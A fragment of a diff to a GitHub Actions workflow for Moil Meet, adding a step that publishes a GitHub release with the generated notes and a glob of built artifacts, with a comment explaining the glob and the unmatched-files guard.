+            fi
+            echo 'MOILMEET_EOF'
+          } >> "$GITHUB_OUTPUT"
+
+      - uses: softprops/action-gh-release@3bb12739c298aeb8a4eeaf626c5b8d85266b0e65 # v2
+        with:
+          tag_name: ${{ needs.prepare.outputs.tag }}
+          name: Moil Meet ${{ needs.prepare.outputs.tag }}
+          body: ${{ steps.notes.outputs.body }}
+          # One glob over whatever the run produced, rather than naming both artifacts: with
+          # `targets` set to a single platform the other directory does not exist, and naming it
+          # would fail the release on `fail_on_unmatched_files`. That guard stays on, so a run
+          # that somehow attached nothing still fails instead of publishing an empty release.
+          files: artifacts/*/*
+          fail_on_unmatched_files: true
